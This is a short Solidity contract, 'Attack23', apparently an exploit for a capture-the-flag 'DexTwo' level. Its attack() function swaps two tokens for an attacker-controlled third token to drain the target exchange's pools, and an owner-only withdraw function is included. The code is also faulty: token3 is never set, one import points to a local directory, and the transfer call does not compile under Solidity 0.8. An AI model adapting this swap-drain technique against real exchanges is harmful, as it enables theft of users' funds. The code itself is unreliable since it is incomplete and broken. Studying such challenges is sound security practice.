// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./23-dextwo.sol";
import "/home/oem/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract Attack23 {
    DexTwo public target;
    address public owner;
    address public token3;
    uint256 public pool;
    

    constructor(address _target, uint256 _amount) {
        owner = msg.sender;
        target = DexTwo(_target);
        pool = _amount;      
    }


    function attack(address _from1, address _from2, uint256 _amount) public {
        target.swap(_from1, token3, _amount);
        target.swap(_from2, token3, _amount);
    }

    receive() external payable {}

     modifier onlyOwner() {
         require (msg.sender == owner, "Only the owner can withdraw");
         _;
     }

     function withdraw() onlyOwner public {
          msg.sender.transfer(address(this).balance);
      }
}


